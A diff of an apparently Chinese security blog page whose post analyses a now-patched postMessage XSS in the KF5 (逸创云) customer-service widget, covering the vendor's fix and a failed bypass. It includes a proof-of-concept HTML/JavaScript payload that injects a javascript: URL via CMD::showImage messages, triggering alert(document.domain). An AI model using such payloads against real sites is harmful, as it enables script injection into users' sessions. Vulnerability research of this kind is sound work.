@@ -1,7 +1,85 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><title>逸创云客服系统 鸡肋xss分析</title>
-<link rel="stylesheet" href="/css/layout.css">
-<link rel="stylesheet" href="/css/main.css">
-<link rel="shortcut icon" href="/img/favicon.png"><meta name="generator" content="Hexo 5.2.0"></head><body><header class="base-menu"><div class="menu-wrapper"><div class="menu-layout-bg"></div><nav class="menu-content"><ul class="menu-list"><li class="menu-item"><a href="/" class="menu-link">雨了个雨's blog</a></li><li class="menu-item"><a href="/blog/archives" class="menu-link">Archives</a></li><li class="menu-item"><a href="/about" class="menu-link">About</a></li></ul></nav></div></header><header class="base-mobile-menu"><div class="mobile-menu-wrapper"><div class="menu-layout-bg"></div><nav class="menu-content"><ul class="menu-list"><li class="menu-item"><a href="/" class="menu-link">雨了个雨's blog</a></li><li class="menu-item"><a href="/blog/archives" class="menu-link">Archives</a></li><li class="menu-item"><a href="/about" class="menu-link">About</a></li></ul></nav><div id="mobile-menu-toggle" class="toggle-menu"><span class="menu-bar"></span><span class="menu-bar"> </span><span class="menu-bar"></span></div></div></header><div class="base-content"><div class="base-content-main"><article class="article-main"><h1 class="article-title">逸创云客服系统 鸡肋xss分析</h1><div class="article-meta"><p class="meta-item meta-time"><span class="meta-item-title">发表于: </span>2019-03-08</p><p class="meta-item meta-category"></p></div><div class="article-content"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>一套云客服系统, 以前我salt哥教我挖的xss, 自己以前做测试的时候遇到过几次用这系统的 打poc都能成功, 不过最近又遇到了一个, 尝试用以前的poc打的时候,发现失败了。看了一下最新的代码, 发现已经修复了。<br>修复方法为<br>1: 限制了postmessage的来源必须是support.kf5.com<br>2: showNotice方法当中, 把innerHTML改成了innerText<br>尝试绕过了一下, 算是失败了吧。</p>
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>逸创云客服系统 鸡肋xss分析 | 雨了个雨&#39;s blog</title>
+
+  
+  <meta name="author" content="雨了个雨">
+  
+
+  
+  <meta name="description" content="Focus On Web Security">
+  
+
+  
+  
+  <meta name="keywords" content="Web">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="逸创云客服系统 鸡肋xss分析"/>
+
+  <meta property="og:site_name" content="雨了个雨&#39;s blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="雨了个雨&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">雨了个雨&#39;s blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>逸创云客服系统 鸡肋xss分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/03/08/逸创云客服-鸡肋xss分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-08T11:53:54.000Z">
+          2019-03-08
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>一套云客服系统, 以前我salt哥教我挖的xss, 自己以前做测试的时候遇到过几次用这系统的 打poc都能成功, 不过最近又遇到了一个, 尝试用以前的poc打的时候,发现失败了。看了一下最新的代码, 发现已经修复了。<br>修复方法为<br>1: 限制了postmessage的来源必须是support.kf5.com<br>2: showNotice方法当中, 把innerHTML改成了innerText<br>尝试绕过了一下, 算是失败了吧。</p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里首先以官网(<a target="_blank" rel="noopener" href="http://www.kf5.com/">http://www.kf5.com</a>) 为例测试一下, 直接看看修复后的代码<br>每一个要使用这套云客户系统的客户, 都需要引入一个js文件。<br><a target="_blank" rel="noopener" href="http://assets-cdn.kf5.com//supportbox//main.js">http://assets-cdn.kf5.com//supportbox//main.js</a></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">    document.write(&#x27;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;\/\/assets-cdn.kf5.com\/supportbox\/main.js?&#x27; + (new Date).getDay() + &#x27;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kf5-provide-supportBox&quot;</span> <span class="attr">kf5-domain</span>=<span class="string">&quot;support.kf5.com&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>&#x27;);</span></span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -36,8 +114,54 @@
 <p>在CMD::showImage分支下, 可以设置#kf5-view-image的alt/src属性。<br>可以设置#kf5-view-image标签的父节点的href/title属性。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_3.jpg" alt="-w478"><br>kf5-view-image标签是img标签, 他的父节点是a标签。 所以可以通过父节点的href属性进行点击xss。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_4.jpg" alt="-w1381"></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://support.kf5.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        var content = `<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">https://www.kf5.com/</span> <span class="attr">id</span>=<span class="string">demo2</span> <span class="attr">onload</span>=<span class="string">&#x27;var popup2 = demo2.contentWindow;var msg2 =\\\&quot;CMD::showImage &#123;\\\\\\&quot;url\\\\\\&quot;:\\\\\\&quot;javascript:alert(document.domain)\\\\\\&quot;&#125;\\\&quot;;popup2.postMessage(msg2, \\\&quot;*\\\&quot;); &#x27;</span>&gt;</span>`</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> popup = demo.contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> msg = <span class="string">`CMD::kf5Notice &#123;&quot;content&quot;: &quot;<span class="subst">$&#123;content&#125;</span>&quot;&#125;`</span></span></span><br><span class="line"><span class="javascript">        popup.postMessage(msg, <span class="string">&quot;*&quot;</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://5alt.me/">https://5alt.me/</a></p>
-</div></article><div id="base-discus"></div></div></div><footer class="base-footer"><div class="footer-wrapper"><span>雨了个雨 Using </span><a target="_blank" rel="noopener" href="https://github.com/chuguixin/Simple"><span>Simple</span></a><span> Presents For You.</span></div></footer><div class="dom-ready">
-<script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
 
-<script src="/js/base.js"></script>
-</div></body></html>
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2020 雨了个雨
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
